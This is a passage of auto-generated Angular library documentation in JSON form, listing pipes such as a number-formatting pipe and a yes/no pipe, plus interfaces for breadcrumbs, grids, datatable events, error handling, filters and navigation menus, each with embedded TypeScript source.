                      "defaultValue": "false",
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                }
        ],
        "ngname": "numberInput",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n\r\nconst PADDING = '000000000';\r\n\r\n@Pipe({ name: 'numberInput' })\r\nexport class NumberInputPipe implements PipeTransform {\r\n\r\n  private DECIMAL_SEPARATOR = ',';\r\n  private THOUSANDS_SEPARATOR = ' ';\r\n\r\n  private handleIntegerAndFractions(integer: string, fraction: string, fractionSize: number, dynamicFractionSize = false) {\r\n    const negative = integer.startsWith('-');\r\n    if ( ( integer === '' && fraction === '' ) || integer === 'NaN' ) {\r\n      return { integer: null, fraction: null };\r\n    } else if ( integer === '' ) {\r\n      integer = '0';\r\n    } else if ( integer.includes('-') ) {\r\n      if ( integer === '-' ) {\r\n        integer = '-0';\r\n      } else {\r\n        integer = '-' + parseInt(integer, 10) * -1; // To handle -0.123\r\n      }\r\n    } else {\r\n      integer = parseInt(integer, 10) + '';\r\n    }\r\n\r\n    if ( fraction.length > fractionSize && !dynamicFractionSize ) {\r\n      const number = parseFloat('0.' + fraction);\r\n      const exp = Math.pow(10, fractionSize);\r\n      const rounded = Math.round(number * exp) / exp;\r\n      if ( rounded === 1 ) {\r\n        const addValue = negative ? -1 : 1;\r\n        integer = ( parseInt(integer || '0', 10) + addValue ) + '';\r\n        fraction = '';\r\n      } else {\r\n        fraction = ( rounded + '' ).split('.')[ 1 ] || '';\r\n      }\r\n    }\r\n\r\n    return { integer, fraction };\r\n  }\r\n\r\n  transform(value: number | string | null, fractionSize: number = 5, dynamicFractionSize = false): string {\r\n    if ( !value && value !== 0 ) {\r\n      return '';\r\n    }\r\n    value = value + '';\r\n    // eslint-disable-next-line\r\n    const re = /[\\^¨~`´_:;!\"#¤%&/()=@£$€{\\[]/g;\r\n    value = value.replace(re, '');\r\n\r\n    value = value.replace('.', this.DECIMAL_SEPARATOR);\r\n    const [ integerSplit, fractionSplit = '' ] = value.split(this.DECIMAL_SEPARATOR);\r\n    let { integer, fraction } = this.handleIntegerAndFractions(integerSplit, fractionSplit, fractionSize, dynamicFractionSize);\r\n    if ( integer === null ) {\r\n      return '';\r\n    }\r\n    if ( dynamicFractionSize ) {\r\n      fraction = fraction ? this.DECIMAL_SEPARATOR + ( fraction ) : '';\r\n    } else {\r\n      fraction = fractionSize > 0\r\n        ? this.DECIMAL_SEPARATOR + ( fraction + PADDING ).substring(0, fractionSize)\r\n        : '';\r\n    }\r\n\r\n    integer = integer.replace(/\\B(?=(\\d{3})+(?!\\d))/g, this.THOUSANDS_SEPARATOR);\r\n\r\n\r\n    return integer + fraction;\r\n  }\r\n\r\n\r\n  parse(value: string, fractionSize: number = 5, dynamicFractionSize = false): string {\r\n    value = value + '';\r\n    // eslint-disable-next-line\r\n    const re = /[\\^¨~`´_:;!\"#¤%&/()=@£$€{\\[]/g;\r\n    value = value.replace(re, '');\r\n    value = value.replace('.', this.DECIMAL_SEPARATOR);\r\n    // eslint-disable-next-line prefer-const\r\n    let [ integerSplit, fractionSplit = '' ] = ( value || '' ).split(this.DECIMAL_SEPARATOR);\r\n\r\n    integerSplit = integerSplit.replace(new RegExp(this.THOUSANDS_SEPARATOR, 'g'), '');\r\n    // eslint-disable-next-line prefer-const\r\n    let { integer, fraction } = this.handleIntegerAndFractions(integerSplit, fractionSplit, fractionSize, dynamicFractionSize);\r\n\r\n    if ( dynamicFractionSize ) {\r\n      fraction = fraction ? `.${fraction}` : '';\r\n    } else {\r\n      fraction = fractionSize > 0\r\n        ? '.' + ( fraction + PADDING ).substring(0, fractionSize)\r\n        : '';\r\n    }\r\n\r\n\r\n    if ( !integer ) {\r\n      return '';\r\n    }\r\n    return integer + fraction;\r\n  }\r\n\r\n}\r\n"
      },
      {
        "name": "YesNoPipe",
        "id": "pipe-YesNoPipe-0221cc8247b9ce3837c0a3eb4e2170e755455cabedcd79647ec2ee33bcfc9cb8c70106856c7777b50d0dac5c14d2c35e0fe777203a4e6241b481b63d62387406",
        "file": "libs/core/src/lib/sto-pipes/yes-no.ts",
        "type": "pipe",
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "properties": [],
        "methods": [
          {
            "name": "transform",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ignoreNulls",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "false"
              }
            ],
            "optional": false,
            "returnType": "string",
            "typeParameters": [],
            "line": 4,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "ignoreNulls",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "defaultValue": "false",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "ngname": "yesNo",
        "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\r\n@Pipe({name: 'yesNo'})\r\nexport class YesNoPipe implements PipeTransform {\r\n  transform(value: boolean, ignoreNulls = false): string {\r\n    let valueStr = '';\r\n    if (ignoreNulls) {\r\n      valueStr = value ? 'Yes' : value === false ? 'No' : '';\r\n    } else {\r\n      valueStr = value ? 'Yes' : 'No';\r\n    }\r\n    return valueStr;\r\n\r\n  }\r\n}\r\n"
      }
    ],
    "interfaces": [
      {
        "name": "Activate",
        "id": "interface-Activate-ba51dacad4326a052ff9b68d45443e72effc1b6b12130d923b302383e265e42d561c76a40dd12a3ad161b110eeea14165fd88edf87e64cf08cb55200ea6a2454",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { Column } from './columns';\r\n\r\nexport interface ContextMenu {\r\n  event: MouseEvent | KeyboardEvent;\r\n  column: Column;\r\n}\r\n\r\ninterface RowCtx<T extends Record<string, unknown>> {\r\n  row: T;\r\n  index: number;\r\n}\r\n\r\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\r\nexport type HeaderContextMenu = ContextMenu;\r\n\r\ninterface Activate<T extends Record<string, unknown>> {\r\n  row: T;\r\n  event: MouseEvent | KeyboardEvent;\r\n  index: number;\r\n  rowEl?: HTMLDivElement;\r\n}\r\n\r\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: MouseEvent | KeyboardEvent;\r\n}\r\n\r\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: KeyboardEvent;\r\n}\r\n",
        "properties": [
          {
            "name": "event",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MouseEvent | KeyboardEvent",
            "optional": false,
            "description": "",
            "line": 18
          },
          {
            "name": "index",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 19
          },
          {
            "name": "row",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "T",
            "optional": false,
            "description": "",
            "line": 17
          },
          {
            "name": "rowEl",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "HTMLDivElement",
            "optional": true,
            "description": "",
            "line": 20
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "Breadcrumb",
        "id": "interface-Breadcrumb-aea0320f010d5e62952561a6fd5ac5125af2fd4299b33e118e0ea786e920f50896d0ed7f52e93b3e41be97ac53e1ce0ca90a9d239dd2fdd631ccf11e4f0e2d77",
        "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { EventEmitter, InjectionToken } from '@angular/core';\r\n\r\nexport interface Breadcrumb {\r\n  label: string;\r\n  command?: (...args: Array<unknown>) => void;\r\n  segment?: string;\r\n  disabled?: boolean;\r\n  eventEmitter?: EventEmitter<unknown>;\r\n  url?: string;\r\n}\r\n\r\nexport interface BreadcrumbConfig { icon?: string; svgIcon?: string; text?: string };\r\n\r\nexport const NAVIGATION_HOME_ICON = new InjectionToken<BreadcrumbConfig>('sto-home-icon');\r\n",
        "properties": [
          {
            "name": "command",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "function",
            "optional": true,
            "description": "",
            "line": 5
          },
          {
            "name": "disabled",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": true,
            "description": "",
            "line": 7
          },
          {
            "name": "eventEmitter",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "EventEmitter<>",
            "optional": true,
            "description": "",
            "line": 8
          },
          {
            "name": "label",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 4
          },
          {
            "name": "segment",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 6
          },
          {
            "name": "url",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 9
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "BreadcrumbConfig",
        "id": "interface-BreadcrumbConfig-aea0320f010d5e62952561a6fd5ac5125af2fd4299b33e118e0ea786e920f50896d0ed7f52e93b3e41be97ac53e1ce0ca90a9d239dd2fdd631ccf11e4f0e2d77",
        "file": "libs/common/src/lib/sto-breadcrumbs/breadcrumb.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { EventEmitter, InjectionToken } from '@angular/core';\r\n\r\nexport interface Breadcrumb {\r\n  label: string;\r\n  command?: (...args: Array<unknown>) => void;\r\n  segment?: string;\r\n  disabled?: boolean;\r\n  eventEmitter?: EventEmitter<unknown>;\r\n  url?: string;\r\n}\r\n\r\nexport interface BreadcrumbConfig { icon?: string; svgIcon?: string; text?: string };\r\n\r\nexport const NAVIGATION_HOME_ICON = new InjectionToken<BreadcrumbConfig>('sto-home-icon');\r\n",
        "properties": [
          {
            "name": "icon",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 12
          },
          {
            "name": "svgIcon",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 12
          },
          {
            "name": "text",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 12
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "BreakpointConfig",
        "id": "interface-BreakpointConfig-58c656e4f218fe8f42bfd4346a68fbcddc2e14b017db910bf9e0ada8f6be20fa43b4d91d7f7c84f64d2c7b1c7187442cc92cbd510cc276c9df6bf544f7dc985b",
        "file": "libs/core/src/lib/sto-directives/sto-grid.directive.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { AfterViewInit, ContentChildren, Directive, ElementRef, HostBinding, Input, OnDestroy, QueryList } from '@angular/core';\r\n\r\ninterface BreakpointConfig {\r\n  2: number;\r\n  4: number;\r\n}\r\n\r\nconst getClass = (width: number, small = 400, large = 800) => {\r\n  let cols = 1;\r\n  if ( width > small ) {\r\n    cols += 1;\r\n  }\r\n  if ( width > large ) {\r\n    cols += 2;\r\n  }\r\n  return `sto-f-grid--${cols}`;\r\n};\r\n\r\nconst ALL_GRIDS = [ 'sto-f-grid--1', 'sto-f-grid--2', 'sto-f-grid--4', 'sto-f-grid--6' ];\r\n\r\n@Directive({ selector: '[stoGridSpacer]' })\r\nexport class StoGridSpacerDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  @HostBinding('class.sto-f-grid__col--spacer')\r\n  useClass = true;\r\n}\r\n\r\n@Directive({ selector: '[stoGridColumn]' })\r\nexport class StoGridColumnDirective {\r\n  @HostBinding('class.sto-f-grid__col')\r\n  useClass = true;\r\n  @HostBinding('class.sto-f-grid__col--2')\r\n  @Input()\r\n  stoGridColumnDouble: boolean;\r\n\r\n}\r\n\r\n@Directive({\r\n  selector: '[stoGrid]',\r\n  exportAs: 'stoGrid'\r\n})\r\nexport class StoGridDirective implements AfterViewInit, OnDestroy {\r\n  @HostBinding('style.max-width.px')\r\n  @Input()\r\n  maxWidth = 1000;\r\n  @HostBinding('style.min-width.px')\r\n  @Input()\r\n  minWidth = 250;\r\n  @HostBinding('class.sto-f-grid')\r\n  baseClass = true;\r\n  @ContentChildren(StoGridColumnDirective, { read: ElementRef })\r\n  columns: QueryList<ElementRef<HTMLElement>>;\r\n  @Input()\r\n  breakpoints: BreakpointConfig;\r\n\r\n  private observer: ResizeObserver;\r\n\r\n  constructor(\r\n    private elRef: ElementRef<HTMLElement>,\r\n  ) {\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    const el = this.elRef.nativeElement as HTMLElement;\r\n    this.observer = new ResizeObserver(entries => {\r\n      for ( const entry of entries ) {\r\n        const cr = entry.contentRect;\r\n        const { width } = cr;\r\n        const breakpoints = this.breakpoints || { 2: 400, 4: 800 };\r\n        const gridType = getClass(width, breakpoints[ 2 ], breakpoints[ 4 ]);\r\n        if ( !el.classList.contains(gridType) ) {\r\n          el.classList.remove(...ALL_GRIDS);\r\n          el.classList.add(gridType);\r\n        }\r\n      }\r\n    });\r\n    this.observer.observe(this.elRef.nativeElement);\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    if ( this.observer ) {\r\n      this.observer.disconnect();\r\n    }\r\n  }\r\n\r\n}\r\n\r\n",
        "properties": [
          {
            "name": "2",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 4
          },
          {
            "name": "4",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 5
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "Chainable",
        "id": "interface-Chainable-d595b5ee3b2bf65f846b8bf1aa4a889c8e96b8df0fa723c86c8fdb6696ce4922b872be3223ff025e5b74eca30b795996b7b29daaf86d905afe9357f1a11bb007",
        "file": "apps/oilmod-web-e2e/src/support/commands.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "declare namespace Cypress {\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  interface Chainable<Subject> {\r\n    login(email: string, password: string): void;\r\n  }\r\n}\r\n//\r\n// -- This is a parent command --\r\nCypress.Commands.add('login', (email, password) => {\r\n  console.log('Custom command example: Login', email, password);\r\n});\r\n//\r\n// -- This is a child command --\r\n// Cypress.Commands.add(\"drag\", { prevSubject: 'element'}, (subject, options) => { ... })\r\n//\r\n//\r\n// -- This is a dual command --\r\n// Cypress.Commands.add(\"dismiss\", { prevSubject: 'optional'}, (subject, options) => { ... })\r\n//\r\n//\r\n// -- This will overwrite an existing command --\r\n// Cypress.Commands.overwrite(\"visit\", (originalFn, url, options) => { ... })\r\n",
        "properties": [],
        "indexSignatures": [],
        "kind": 167,
        "methods": [
          {
            "name": "login",
            "args": [
              {
                "name": "email",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "password",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 15,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "email",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              },
              {
                "name": "password",
                "type": "string",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ]
      },
      {
        "name": "ContextMenu",
        "id": "interface-ContextMenu-ba51dacad4326a052ff9b68d45443e72effc1b6b12130d923b302383e265e42d561c76a40dd12a3ad161b110eeea14165fd88edf87e64cf08cb55200ea6a2454",
        "file": "libs/datatable/src/lib/sto-datatable/events.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { Column } from './columns';\r\n\r\nexport interface ContextMenu {\r\n  event: MouseEvent | KeyboardEvent;\r\n  column: Column;\r\n}\r\n\r\ninterface RowCtx<T extends Record<string, unknown>> {\r\n  row: T;\r\n  index: number;\r\n}\r\n\r\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\r\nexport type HeaderContextMenu = ContextMenu;\r\n\r\ninterface Activate<T extends Record<string, unknown>> {\r\n  row: T;\r\n  event: MouseEvent | KeyboardEvent;\r\n  index: number;\r\n  rowEl?: HTMLDivElement;\r\n}\r\n\r\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: MouseEvent | KeyboardEvent;\r\n}\r\n\r\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\r\n  event: KeyboardEvent;\r\n}\r\n",
        "properties": [
          {
            "name": "column",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Column",
            "optional": false,
            "description": "",
            "line": 5
          },
          {
            "name": "event",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MouseEvent | KeyboardEvent",
            "optional": false,
            "description": "",
            "line": 4
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "ErrorHandler",
        "id": "interface-ErrorHandler-b62d76eb54701a6b99a9648adc50d2507a27e68be985d86dd50ad12d40f9aaf5c93cc2e6c1038ad8899110984eec045c1e065cd4f097a7a8f561c04887b2d795",
        "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\r\nimport { HttpError } from './http-error';\r\n\r\n/**\r\n * Public interface for the error handler class.\r\n */\r\nexport interface StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  getErrorText?: (err: HttpErrorResponse) => string;\r\n}\r\n\r\n/**\r\n * Internal interface for our errorhandler.\r\n */\r\nexport interface ErrorHandler extends StoErrorHandler {\r\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\r\n  defaultHandler: Handler;\r\n}\r\n\r\n/**\r\n * Interface for the ErrorLogger injection token.\r\n */\r\nexport interface ErrorLogger {\r\n  log: (arg0: HttpError) => void;\r\n}\r\n\r\n// Expected signature for error handlers.\r\nexport type Handler = (err: HttpErrorResponse) => HttpError;\r\n\r\n",
        "properties": [
          {
            "name": "defaultHandler",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Handler",
            "optional": false,
            "description": "",
            "line": 18
          },
          {
            "name": "handler",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "function",
            "optional": false,
            "description": "",
            "line": 17
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "description": "<p>Internal interface for our errorhandler.</p>\n",
        "rawdescription": "\n\nInternal interface for our errorhandler.\n",
        "methods": [],
        "extends": "StoErrorHandler"
      },
      {
        "name": "ErrorLogger",
        "id": "interface-ErrorLogger-b62d76eb54701a6b99a9648adc50d2507a27e68be985d86dd50ad12d40f9aaf5c93cc2e6c1038ad8899110984eec045c1e065cd4f097a7a8f561c04887b2d795",
        "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\r\nimport { HttpError } from './http-error';\r\n\r\n/**\r\n * Public interface for the error handler class.\r\n */\r\nexport interface StoErrorHandler {\r\n  [ code: number ]: Handler;\r\n\r\n  getErrorText?: (err: HttpErrorResponse) => string;\r\n}\r\n\r\n/**\r\n * Internal interface for our errorhandler.\r\n */\r\nexport interface ErrorHandler extends StoErrorHandler {\r\n  handler: (err: HttpErrorResponse, handler?: Handler) => void;\r\n  defaultHandler: Handler;\r\n}\r\n\r\n/**\r\n * Interface for the ErrorLogger injection token.\r\n */\r\nexport interface ErrorLogger {\r\n  log: (arg0: HttpError) => void;\r\n}\r\n\r\n// Expected signature for error handlers.\r\nexport type Handler = (err: HttpErrorResponse) => HttpError;\r\n\r\n",
        "properties": [
          {
            "name": "log",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "function",
            "optional": false,
            "description": "",
            "line": 25
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "description": "<p>Interface for the ErrorLogger injection token.</p>\n",
        "rawdescription": "\n\nInterface for the ErrorLogger injection token.\n",
        "methods": []
      },
      {
        "name": "FilterList",
        "id": "interface-FilterList-a39f73ad529ac9d51e1175b4351ade065081a3ea49d1dc5b72312f0f54d1ea7099371e968389d8410abc28a21583698ced663dc46774fd68f05988a64ec61eba",
        "file": "libs/common/src/lib/sto-filter/filter.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "import { FormBuilder, FormGroup } from '@angular/forms';\r\nimport { EventEmitter, Input, OnDestroy, OnInit, Output, Directive } from '@angular/core';\r\nimport { Observable, OperatorFunction, Subject } from 'rxjs';\r\nimport { debounceTime, startWith, takeUntil } from 'rxjs/operators';\r\n\r\nexport interface FilterList {\r\n  key: string;\r\n  value: string;\r\n  index?: number;\r\n}\r\n\r\n/**\r\n * Abstract class utilized to decrease boiler plate for filters.\r\n * Given that most filters are identical in their base setup (a reactive form, using sto-filter-panel etc), this simplify writing filters.\r\n * It also allows you to have filter chips in your filter title with a base implementation (only needs a formConfig & serializer fn)\r\n */\r\n@Directive()\r\nexport abstract class FilterForm<T extends Record<string, unknown>> implements OnInit, OnDestroy {\r\n  // FormBuilder config\r\n  abstract formConfig: { [ key: string ]: unknown };\r\n  // Serializer function\r\n  abstract serializer: OperatorFunction<T, FilterList[]>;\r\n  protected destroyed$ = new Subject();\r\n  // Most filters will emit a filterChanged event\r\n  @Output()\r\n  filterChanged = new EventEmitter<T>();\r\n  // Initial value of the filter\r\n  @Input()\r\n  value: T;\r\n\r\n  // Form group\r\n  public form: FormGroup;\r\n  // Chip value. See {@link FilterList}\r\n  public filter$: Observable<FilterList[]>;\r\n\r\n  constructor(private fb: FormBuilder) {\r\n  }\r\n\r\n  ngOnInit() {\r\n    this.form = this.fb.group(this.formConfig);\r\n    this.form.reset(this.value || {});\r\n    this.filter$ = this.form\r\n      .valueChanges\r\n      .pipe(startWith<T>(this.form.value), this.serializer);\r\n    this.form.valueChanges\r\n      .pipe(\r\n        startWith(this.form.value),\r\n        debounceTime(250),\r\n        takeUntil(this.destroyed$)\r\n      ).subscribe(value => this.filterChanged.emit(value));\r\n  }\r\n\r\n  ngOnDestroy() {\r\n    this.destroyed$.next(true);\r\n    this.destroyed$.complete();\r\n  }\r\n\r\n  /**\r\n   * This function clears the value for the given key.\r\n   * If index is passed in, it assumes the value for the key is an array, and removes the value at the given index.\r\n   * @param key\r\n   * @param index\r\n   */\r\n  public clearFilter(key: string, index?: number) {\r\n    if ( index || index === 0 ) {\r\n      const val = [...(this.form.get(key)?.value ?? [])];\r\n      val.splice(index, 1);\r\n      this.form.get(key)?.reset(val);\r\n    } else {\r\n      this.form.get(key)?.reset();\r\n    }\r\n  }\r\n\r\n  // Util function to resize tables. Looking to get rid of this...\r\n  public toggled() {\r\n    setTimeout(() => window.dispatchEvent(new Event('resize')), 300);\r\n  }\r\n\r\n}\r\n",
        "properties": [
          {
            "name": "index",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": true,
            "description": "",
            "line": 9
          },
          {
            "name": "key",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 7
          },
          {
            "name": "value",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": false,
            "description": "",
            "line": 8
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "MenuGroup",
        "id": "interface-MenuGroup-bd9331e390bf491d6c9ec37613b61f8592c288e4e551820291fa47240cb9690b29cc58d2d972409aa238d0c80636ba1513cb9fe340e10ef0b5ba864a34231163",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "export type Menu = {\r\n  groups: MenuGroup[];\r\n} & Record<string, unknown>;\r\n\r\nexport interface MenuGroup {\r\n  hasDivider?: boolean;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  items: MenuItem[];\r\n  name?: string;\r\n}\r\n\r\nexport interface MenuItem {\r\n  id?: string;\r\n  name?: string;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  command?: MenuItemCommand;\r\n  error?: string;\r\n}\r\n\r\nexport interface MenuItemCommand {\r\n  type: MenuItemTypes;\r\n  /**\r\n   * For internal urls: RouterCommands.\r\n   * For external urls, should just be array with one element (the full url)\r\n   */\r\n  arguments: Array<string | number>;\r\n}\r\n\r\nexport interface NavigateCommand {\r\n  $event: MouseEvent | KeyboardEvent;\r\n  command?: Array<string | number>;\r\n}\r\n\r\nexport enum MenuItemTypes {\r\n  External = 'externalLink',\r\n  ExternalNew = 'externalLinkNewWindow',\r\n  Internal = 'internalLink',\r\n  Navigate = 'navigate'\r\n}\r\n",
        "properties": [
          {
            "name": "hasDivider",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": true,
            "description": "",
            "line": 6
          },
          {
            "name": "icon",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 7
          },
          {
            "name": "items",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MenuItem[]",
            "optional": false,
            "description": "",
            "line": 9
          },
          {
            "name": "name",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 10
          },
          {
            "name": "svgIcon",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": true,
            "description": "",
            "line": 8
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "MenuItem",
        "id": "interface-MenuItem-bd9331e390bf491d6c9ec37613b61f8592c288e4e551820291fa47240cb9690b29cc58d2d972409aa238d0c80636ba1513cb9fe340e10ef0b5ba864a34231163",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "export type Menu = {\r\n  groups: MenuGroup[];\r\n} & Record<string, unknown>;\r\n\r\nexport interface MenuGroup {\r\n  hasDivider?: boolean;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  items: MenuItem[];\r\n  name?: string;\r\n}\r\n\r\nexport interface MenuItem {\r\n  id?: string;\r\n  name?: string;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  command?: MenuItemCommand;\r\n  error?: string;\r\n}\r\n\r\nexport interface MenuItemCommand {\r\n  type: MenuItemTypes;\r\n  /**\r\n   * For internal urls: RouterCommands.\r\n   * For external urls, should just be array with one element (the full url)\r\n   */\r\n  arguments: Array<string | number>;\r\n}\r\n\r\nexport interface NavigateCommand {\r\n  $event: MouseEvent | KeyboardEvent;\r\n  command?: Array<string | number>;\r\n}\r\n\r\nexport enum MenuItemTypes {\r\n  External = 'externalLink',\r\n  ExternalNew = 'externalLinkNewWindow',\r\n  Internal = 'internalLink',\r\n  Navigate = 'navigate'\r\n}\r\n",
        "properties": [
          {
            "name": "command",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MenuItemCommand",
            "optional": true,
            "description": "",
            "line": 18
          },
          {
            "name": "error",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 19
          },
          {
            "name": "icon",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 16
          },
          {
            "name": "id",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 14
          },
          {
            "name": "name",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "string",
            "optional": true,
            "description": "",
            "line": 15
          },
          {
            "name": "svgIcon",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": true,
            "description": "",
            "line": 17
          }
        ],
        "indexSignatures": [],
        "kind": 165,
        "methods": []
      },
      {
        "name": "MenuItemCommand",
        "id": "interface-MenuItemCommand-bd9331e390bf491d6c9ec37613b61f8592c288e4e551820291fa47240cb9690b29cc58d2d972409aa238d0c80636ba1513cb9fe340e10ef0b5ba864a34231163",
        "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
        "deprecated": false,
        "deprecationMessage": "",
        "type": "interface",
        "sourceCode": "export type Menu = {\r\n  groups: MenuGroup[];\r\n} & Record<string, unknown>;\r\n\r\nexport interface MenuGroup {\r\n  hasDivider?: boolean;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  items: MenuItem[];\r\n  name?: string;\r\n}\r\n\r\nexport interface MenuItem {\r\n  id?: string;\r\n  name?: string;\r\n  icon?: string;\r\n  svgIcon?: boolean;\r\n  command?: MenuItemCommand;\r\n  error?: string;\r\n}\r\n\r\nexport interface MenuItemCommand {\r\n  type: MenuItemTypes;\r\n  /**\r\n   * For internal urls: RouterCommands.\r\n   * For external urls, should just be array with one element (the full url)\r\n   */\r\n  arguments: Array<string | number>;\r\n}\r\n\r\nexport interface NavigateCommand {\r\n  $event: MouseEvent | KeyboardEvent;\r\n  command?: Array<string | number>;\r\n}\r\n\r\nexport enum MenuItemTypes {\r\n  External = 'externalLink',\r\n  ExternalNew = 'externalLinkNewWindow',\r\n  Internal = 'internalLink',\r\n  Navigate = 'navigate'\r\n}\r\n",
        "properties": [
          {
            "name": "arguments",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Array<string | number>",
            "optional": false,
